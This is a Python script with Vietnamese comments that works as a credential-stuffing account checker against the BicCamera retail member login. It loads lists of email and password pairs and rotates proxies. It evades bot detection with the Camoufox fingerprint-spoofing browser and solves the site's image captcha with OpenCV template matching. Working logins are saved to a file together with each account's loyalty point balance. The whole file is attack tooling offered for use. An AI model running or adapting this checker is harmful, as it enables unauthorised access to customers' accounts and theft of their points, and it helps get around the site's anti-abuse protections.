import time
import logging
import threading
from queue import Queue
import os
import colorama
from datetime import datetime
import signal
import sys
import atexit
import shutil
import pyautogui
from camoufox.async_api import AsyncCamoufox
import time
import cv2
import numpy as np
from browserforge.fingerprints import Screen
import asyncio
import os
os.makedirs("./debug", exist_ok=True)

colorama.init()

successful_accounts = []
failed_accounts = []
browsers = []

def cleanup_browsers():
    """Dọn dẹp tất cả các Browser instances."""
    logging.warning("Đang dọn dẹp browsers...")
    global browsers
    for browser in browsers[:]:
        try:
            browser.close()
        except Exception as e:
            logging.warning(f"Lỗi khi đóng browser: {e}")
        finally:
            if browser in browsers:
                browsers.remove(browser)

def signal_handler(sig, frame):
    """Xử lý SIGINT (Ctrl+C) và SIGTERM (đóng terminal)."""
    logging.info("Nhận tín hiệu dừng. Đang dọn dẹp...")
    cleanup_browsers()
    clean_all_user_data()
    logging.info("Dọn dẹp hoàn tất. Thoát...")
    sys.exit(0)

# Setup logging
COLOR_RESET = '\033[0m'
COLOR_INFO = '\033[32m'    # Green
COLOR_WARNING = '\033[33m' # Yellow
COLOR_ERROR = '\033[31m'   # Red

class ColorFormatter(logging.Formatter):
    def format(self, record):
        color = ''
        if record.levelno == logging.INFO:
            color = COLOR_INFO
        elif record.levelno == logging.WARNING:
            color = COLOR_WARNING
        elif record.levelno == logging.ERROR:
            color = COLOR_ERROR
        msg = super().format(record)
        return f"{color}{msg}{COLOR_RESET}"
    
    def formatTime(self, record, datefmt=None):
        dt = datetime.fromtimestamp(record.created)
        return dt.strftime("%H:%M")

# Create stream handler with color
console_handler = logging.StreamHandler()
console_handler.setFormatter(ColorFormatter(
    '%(asctime)s - %(levelname)s - %(message)s'
))

# File handler without color
file_handler = logging.FileHandler('automation.log', encoding='utf-8')
file_handler.setFormatter(logging.Formatter(
    '%(asctime)s - %(levelname)s - [%(threadName)s] - %(message)s'
))

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    handlers=[file_handler, console_handler]
)

# Hide verbose logs
logging.getLogger('playwright').setLevel(logging.WARNING)
logging.getLogger('urllib3').setLevel(logging.WARNING)

# Global variables
file_lock = threading.Lock()
show_browser = True

def load_input_files():
    """Tải tài khoản từ accounts.txt và proxy từ proxy.txt"""
    try:
        accounts = []
        with open('accounts.txt', 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#') and '||' in line:
                    parts = line.split('||')
                    if len(parts) >= 2:
                        accounts.append({
                            'email': parts[0].strip(),
                            'password': parts[1].strip()
                        })
        # Load proxies (optional)
        proxies = []
        try:
            with open('proxy.txt', 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        # Handle different proxy formats
                        if '@' in line:
                            # Format: host:port@username:password
                            try:
                                host_port, credentials = line.split('@', 1)
                                if ':' in credentials:
                                    username, password = credentials.split(':', 1)
                                else:
                                    username, password = credentials, ""
                                
                                proxies.append({
                                    'server': f"http://{host_port}",
                                    'username': username,
                                    'password': password,
                                    'full': line
                                })
                            except Exception as e:
                                logging.warning(f"Không thể parse proxy: {line} - {e}")
                        else:
                            # Handle format: host:port:username:password or host:port
                            parts = line.split(':')
                            if len(parts) >= 4:
                                proxies.append({
                                    'server': f"http://{parts[0]}:{parts[1]}",
                                    'username': parts[2],
                                    'password': parts[3],
                                    'full': line
                                })
                            elif len(parts) >= 2:
                                proxies.append({
                                    'server': f"http://{parts[0]}:{parts[1]}",
                                    'username': None,
                                    'password': None,
                                    'full': line
                                })
        except FileNotFoundError:
            logging.warning("proxy.txt không tìm thấy. Chạy mà không dùng proxy.")
        
        if not accounts:
            logging.error("Không tìm thấy tài khoản hợp lệ trong accounts.txt")
            raise ValueError("Không có tài khoản để xử lý")
        
        logging.info(f"Đã tải {len(accounts)} tài khoản và {len(proxies)} proxy")
        return accounts, proxies
    
    except Exception as e:
        logging.error(f"Lỗi khi tải file đầu vào: {repr(e)}")
        raise

def _remove_account_from_file(email):
    """Remove account from accounts.txt file"""
    # try:
    #     with file_lock:
    #         with open('accounts.txt', 'r', encoding='utf-8') as f:
    #             lines = f.readlines()
            
    #         with open('accounts.txt', 'w', encoding='utf-8') as f:
    #             for line in lines:
    #                 if line.strip() and not line.startswith('#'):
    #                     parts = line.strip().split('||')
    #                     if len(parts) >= 1 and parts[0].strip() != email:
    #                         f.write(line)
    #                 else:
    #                     f.write(line)
    #         logging.debug(f"🗑️ Đã xóa {email} khỏi accounts.txt")
    # except Exception as e:
    #     logging.warning(f"Không thể xóa {email} khỏi accounts.txt: {e}")
# =========================
# LOAD TEMPLATE
# =========================
template = cv2.imread("./captcha.png", 0)

# =========================
# MATCH FUNCTION
# =========================
def is_match(img, idx=None):
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)

    h, w = template.shape
    gray = cv2.resize(gray, (w, h))

    res = cv2.matchTemplate(gray, template, cv2.TM_CCOEFF_NORMED)
    max_val = np.max(res)

    # print(f"[{idx}] match:", max_val)

    # debug ảnh
    # if idx is not None:
    #     cv2.imwrite(f"debug_{idx}.png", img)

    return max_val > 0.7


# =========================
# SOLVE CAPTCHA
# =========================
async def solve_captcha(page):
    # print("=== SOLVE CAPTCHA ===")

    await page.wait_for_selector(".login_img_div", timeout=5000)
    await asyncio.sleep(1)

    items = page.locator(".login_img_div")
    count = await items.count()

    # print("Captcha items:", count)

    clicked = 0

    for i in range(count):
        item = items.nth(i)

        try:
            # chỉ lấy ảnh visible (OFF)
            img_el = item.locator(".login_img_btn_off img")

            # screenshot -> bytes
            img_bytes = await img_el.screenshot()

            # convert sang OpenCV
            img_np = np.frombuffer(img_bytes, np.uint8)
            img = cv2.imdecode(img_np, cv2.IMREAD_COLOR)

            if is_match(img, i):
                # print(f"--> CLICK {i}")
                await item.click()
                clicked += 1
                await asyncio.sleep(0.3)

        except Exception as e:
            logging.warning(f"Không thể xử lý captcha item {i}: {repr(e)}")
            # print(f"[{i}] ERROR:", e)

    # print("Clicked:", clicked)
    # print("=== DONE CAPTCHA ===")

    return clicked > 0

async def check_account(browser, email, password):
    is_debug = False
    """Kiểm tra tài khoản Rakuten"""
    try:
        logging.info(f"Bắt đầu kiểm tra tài khoản: {email}")
        page = await browser.new_page()
        await page.goto("https://www.biccamera.com/bc/member/SfrLogin.jsp")
        await page.wait_for_timeout(3000)

        # ===== INPUT EMAIL =====
        try:
            email_input = page.locator('input[type="text"]').first
            await email_input.click()
            await email_input.type(email, delay=50)
        except Exception as e:
            logging.warning(f"Không thể nhập email cho {email}: {repr(e)}")
            is_debug = True
            return False, "Lỗi nhập email"

        # ===== INPUT PASSWORD =====
        try:
            password_input = page.locator('input[type="password"]')
            await password_input.click()
            await password_input.type(password, delay=50)
        except Exception as e:
            logging.warning(f"Không thể nhập mật khẩu cho {email}: {repr(e)}")
            is_debug = True
            return False, "Lỗi nhập mật khẩu"

        # ===== CLICK LOGIN =====
        try:
            login_button = page.locator('button[type="submit"]')
            await login_button.click()
        except Exception as e:
            logging.warning(f"Không thể click button đăng nhập cho {email}: {repr(e)}")
            is_debug = True
            return False, "Lỗi click button đăng nhập"

        await asyncio.sleep(2)

        # =========================
        # CAPTCHA LOOP
        # =========================
        for _ in range(3):
            # print(f"\n=== CAPTCHA ATTEMPT {attempt+1} ===")

            if await page.locator("#login_imagecheck").count() > 0:
                await solve_captcha(page)

                await asyncio.sleep(1)
                await login_button.click()
                await asyncio.sleep(3)

                # check còn captcha không
                if await page.locator("#login_imagecheck").count() == 0:
                    logging.info(f"Captcha đã được giải quyết cho {email}.")
                    break
            else:
                print("No captcha found")
                break

        # ===== WAIT RESULT =====
        result = True, "Đăng nhập thành công"
        html_source = await page.content()
        if "Secure Connection Failed" in html_source:
            logging.warning(f"Kết nối bị chặn cho {email}.")
            result = False, "Kết nối bị chặn - Có thể do proxy"
            is_debug = True
            return result[0], result[1]
        # Check "SfrLogin.jsp" vẫn còn trong URL không để xác định nếu login thất bại
        if "SfrLogin.jsp" in page.url:
            # Capture screen and save
            logging.warning(f"Đăng nhập thất bại cho {email}: Acc Die")
            result = False, "Acc Die"
            is_debug = True
            return result[0], result[1]
        await page.wait_for_timeout(5000)
        try:
            personal_point = await page.locator("span.bcs_red").first.inner_text()
            logging.info(f"Điểm cá nhân cho {email}: {personal_point}")
            result = True, f"Điểm cá nhân: {personal_point}"
        except Exception as e:
            logging.warning(f"Không thể lấy điểm cá nhân cho {email}: {e}")
            try:
                personal_point = await page.locator("#bcs_top_personal_point").inner_text()
                logging.info(f"Điểm cá nhân cho {email}: {personal_point}")
                result = True, f"Điểm cá nhân: {personal_point}"
            except Exception as e:
                logging.warning(f"Không thể lấy điểm cá nhân cho {email}: {e}")
                is_debug = True

        _remove_account_from_file(email)
        return result[0], result[1]

    except Exception as e:
        logging.error(f"❌ Lỗi trong quá trình kiểm tra cho {email}: {repr(e)}")
        # Remove account even if there's an exception
        _remove_account_from_file(email)
        return False, repr(e)
    finally:
        if is_debug:
            try:
                screenshot_path = os.path.join("debug", f"{email.replace('@', '_').replace('.', '_')}.png")
                await page.screenshot(path=screenshot_path, full_page=True)
            except Exception as e:
                pass

async def process_account(account, account_index, browser, user_data_dir):
    """Xử lý đăng ký một tài khoản"""
    email, password = account['email'], account['password']
    try:
        logging.debug(f"Đang xử lý tài khoản {account_index + 1}: {email}")
        success, message = await check_account(browser, email, password)
        if not success:
            logging.warning(f"Đăng nhập thất bại cho {email}: Acc Die")

        with file_lock:
            if success:
                successful_accounts.append(account)
                # Lưu tài khoản thành công
                with open('successful_accounts.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{email}|{password}|{message}\n")
            else:
                failed_accounts.append({'account': account, 'error': message})
                # Lưu tài khoản thất bại
                with open('failed_accounts.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{email}|{password}|{message}\n")
        logging.info(f"Hoàn tất xử lý tài khoản: {email}")
    except Exception as e:
        logging.error(f"Lỗi xử lý tài khoản {email}: {repr(e)}")
        with file_lock:
            failed_accounts.append({'account': account, 'error': repr(e)})
            with open('failed_accounts.txt', 'a', encoding='utf-8') as f:
                f.write(f"{email}|{password}|{'Acc lock hoặc lỗi pass'}\n")
    finally:
        # Cleanup browser resources
        try:
            # Đóng browser nếu nó vẫn còn mở
            logging.debug(f"Đang dọn dẹp browser cho {email}")
        except Exception as e:
            logging.debug(f"Lỗi khi đóng browser: {e}")
            pass
        # Delete user_data_dir
        for _ in range(3):
            try:
                if user_data_dir and os.path.exists(user_data_dir):
                    shutil.rmtree(user_data_dir, ignore_errors=True)
                break
            except:
                time.sleep(5)

def clean_all_user_data(retries=5, delay=1):
    """Dọn dẹp tất cả thư mục dữ liệu người dùng"""
    logging.debug("Đang dọn dẹp dữ liệu người dùng...")
    user_data_dir = os.path.join(os.getcwd(), "user-data")
    if os.path.exists(user_data_dir):
        for _ in range(retries):
            try:
                shutil.rmtree(user_data_dir)
                logging.info("Đã dọn dẹp dữ liệu người dùng thành công.")
                break
            except PermissionError:
                time.sleep(delay)
            except Exception as e:
                time.sleep(delay)

def main():
    """Hàm chính"""
    global show_browser
    try:
        # Load input files
        accounts, proxies = load_input_files()
        
        # Clean previous user data
        clean_all_user_data()
        
        # Get number of threads
        try:
            num_threads = int(input("Nhập số luồng để chạy: "))
            if num_threads <= 0:
                logging.warning("Số luồng phải là số dương. Đặt mặc định là 1.")
                num_threads = 1
            if num_threads > len(accounts):
                logging.warning(f"Số luồng ({num_threads}) vượt quá số tài khoản ({len(accounts)}). Đặt thành {len(accounts)}.")
                num_threads = len(accounts)
        except ValueError:
            logging.warning("Đầu vào số luồng không hợp lệ. Đặt mặc định là 1.")
            num_threads = 1
        
        # Nhập lựa chọn hiển thị trình duyệt
        show = input("Bạn có muốn hiển thị cửa sổ trình duyệt không? (y/n): ").strip().lower()
        show_browser = show in ['y', 'yes']
                
        # Setup account queue
        account_queue = Queue()
        screen_width, _ = pyautogui.size()
        col = 4  # Number of columns for browser windows
        
        # Add accounts to queue
        for idx, account in enumerate(accounts):
            account_queue.put((account, idx))
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        browser_init_lock = threading.Lock()

        async def worker():
            """Hàm worker thread"""
            browser = None
            browser_cm = None
            while not account_queue.empty():
                try:
                    account, account_index = account_queue.get()
                    with browser_init_lock:
                        proxy = proxies[account_index % len(proxies)] if len(proxies) > 0 else None
                        # if proxy:
                        #         logging.debug(f"Using proxy for {account['email']}: {proxy}")
                        # logging.info(f"Proxy đang sử dụng cho {account['email']}: {proxy['full'] if proxy else 'Không dùng proxy'}")
                        browser_initialized = False
                        try:
                                user_data_dir = os.path.join(os.getcwd(), "user-data", f"user-data-{account['email'].replace('@', '_').replace('.', '_')}")
                                browser_cm = AsyncCamoufox(
                                    headless=True,
                                    humanize=True,
                                    screen=Screen(max_width=1920, max_height=1080),
                                    geoip=True,
                                    proxy={
                                        'server': proxy['server'] if proxy else None,
                                        'username': proxy['username'] if proxy else None,
                                        'password': proxy['password'] if proxy else None
                                    },
                                    persistent_context=True,
                                    user_data_dir=user_data_dir
                                )
                                browser = await browser_cm.__aenter__()
                                browsers.append(browser)
                                browser_initialized = True
                        except Exception as e:
                                logging.warning(f"Failed to initialize browser with proxy for {account['email']}: {repr(e)}")
                                if browser:
                                    try:
                                        await browser.close()
                                    except:
                                        pass
                                    browser = None
                        if not browser_initialized:
                            raise Exception("Failed to initialize browser proxy")
                    await process_account(account, account_index, browser, user_data_dir)
                except Exception as e:
                    logging.error(f"Lỗi trong worker thread: {repr(e)}")
                    # Log the account as failed
                    with file_lock:
                        failed_accounts.append({'account': account, 'error': repr(e)})
                        with open('failed_accounts.txt', 'a', encoding='utf-8') as f:
                            f.write(f"{account['email']}|{account['password']}|{repr(e)}\n")
                finally:
                    if browser_cm:
                        try:
                            await browser_cm.__aexit__(None, None, None)
                        except Exception as e:
                            logging.debug(f"Lỗi khi thoát browser context cho {account['email']}: {e}")
                        browser_cm = None
                    if browser and browser in browsers:
                        browsers.remove(browser)
                    browser = None
                    account_queue.task_done()

        def thread_worker():
            asyncio.run(worker())
        
        # Start worker threads
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=thread_worker, name=f"Luồng-{i+1}")
            t.start()
            threads.append(t)
        
        # Wait for all threads to complete
        for t in threads:
            t.join()
        
        # Báo cáo cuối cùng và dọn dẹp
        logging.info("Đã xử lý xong tất cả tài khoản.")
        logging.info(f"✅ Kiểm tra thành công: {len(successful_accounts)}")
        logging.info(f"❌ Kiểm tra thất bại: {len(failed_accounts)}")
        
        clean_all_user_data()
        logging.info("Chương trình hoàn tất. Thoát sau 5 giây...")
        time.sleep(5)
        
    except Exception as e:
        logging.error(f"Lỗi trong hàm main: {repr(e)}")
    finally:
        cleanup_browsers()

if __name__ == "__main__":
    try:
        signal.signal(signal.SIGTERM, cleanup_browsers)
        signal.signal(signal.SIGINT, cleanup_browsers)
        atexit.register(cleanup_browsers)
        main()
    except KeyboardInterrupt:
        logging.info("Nhận KeyboardInterrupt. Đang dọn dẹp...")
        cleanup_browsers()
        clean_all_user_data()
        logging.info("Dọn dẹp hoàn tất. Thoát...")
        sys.exit(0)